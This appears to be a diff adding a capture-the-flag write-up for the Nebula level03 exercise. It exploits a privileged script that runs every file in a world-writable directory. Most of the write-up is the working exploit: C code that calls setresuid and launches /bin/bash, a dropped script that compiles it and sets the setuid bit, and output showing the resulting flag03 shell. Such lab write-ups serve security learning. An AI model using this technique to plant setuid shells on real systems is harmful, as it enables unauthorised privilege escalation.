@@ -1,4 +1,6 @@
+Question URL: https://exploit.education/nebula/level-03/
 
+Information gathering:
 
 level03@nebula:/home/flag03$ ls -alR
 .:
@@ -23,16 +25,6 @@ for i in /home/flag03/writable.d/* ; do
         rm -f "$i"
 done
 
-
-level03@nebula:/home/flag03$ more writable.sh
-#!/bin/sh
-
-for i in /home/flag03/writable.d/* ; do
-        (ulimit -t 5; bash -x "$i")
-        rm -f "$i"
-done
-
-
 level03@nebula:/home/flag03$ ulimit -a
 core file size          (blocks, -c) 0
 data seg size           (kbytes, -d) unlimited
@@ -50,3 +42,62 @@ cpu time               (seconds, -t) 5
 max user processes              (-u) 7881
 virtual memory          (kbytes, -v) unlimited
 file locks                      (-x) unlimited
+
+Background Knowledge:
+a. ulimit -t 5: CPU time resource restriction
+b. bash -x file_name: True if the specified file_name exists and executable(shell file). If the file is binary, it cannot execute the file.
+c. writable.sh script does two things:
+   - Check if the specified file exists and then try to execute the file to check if the file is executable (Shell script not binary file)
+   - Then delete the file
+   ** This script is vulnerable as the script executes any files under writable.d directory. writable.sh is executed as flag03 privilege.
+   So when writable.sh executes a script, the script will be executed with flag03 privilege. If a script under writable.d calls any program,
+   the program will be executed with flag03 privilege. What if the program calls /bin/bash. The shell would be running as flag03 privilege.
+   
+Sol.
+a. Figure out user id of user flag03
+$ more /etc/group | grep flag03
+flag03:x:996:               <== User ID is 996
+
+b. Create a program which calls /bin/bash - /tmp/a.c
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+
+int main()
+{
+        setresuid(996, 996, 996);      <= Without this, complied code won't keep effective ID of flag03, even though the code code is set with setuid
+        system("getflag");
+        system("/bin/bash");        
+        return 0;
+}
+   
+   
+c. Shell script compiles a.c and place the executable /home/flag03 (As this shell script runs with flag03 privilege, the compiled
+program can be placed under /home/flag03). Then the script will set setuid to the program
+
+# /home/flag03/writable.d/run.sh
+#!/bin/bash
+gcc /tmp/a.c -o /home/flag03/a         <= Compile the code and save the compiled code under /home/flag03
+chmod +s /home/flag03/a                <= Set setuid to the compiled code a
+
+# Make run.sh as executable
+$chmod +x /home/flag03/writable.d/run.sh
+
+d. Run a
+level03@nebula:/home/flag03$ ls -al
+total 14
+drwxr-x--- 1 flag03 level03   80 2019-02-08 06:36 .
+drwxr-xr-x 1 root   root     160 2012-08-27 07:18 ..
+-rwsrwsr-x 1 flag03 flag03  7198 2019-02-08 06:36 a
+-rw-r--r-- 1 flag03 flag03   220 2011-05-18 02:54 .bash_logout
+-rw-r--r-- 1 flag03 flag03  3353 2011-05-18 02:54 .bashrc
+-rw-r--r-- 1 flag03 flag03   675 2011-05-18 02:54 .profile
+drwxrwxrwx 1 flag03 flag03    40 2019-02-08 06:36 writable.d
+-rwxr-xr-x 1 flag03 flag03    98 2011-11-20 21:22 writable.sh
+
+level03@nebula:/home/flag03$ ./a
+You have successfully executed getflag on a target account
+bash-4.2$ id
+uid=996(flag03) gid=1004(level03) groups=996(flag03),1004(level03)
+bash-4.2$
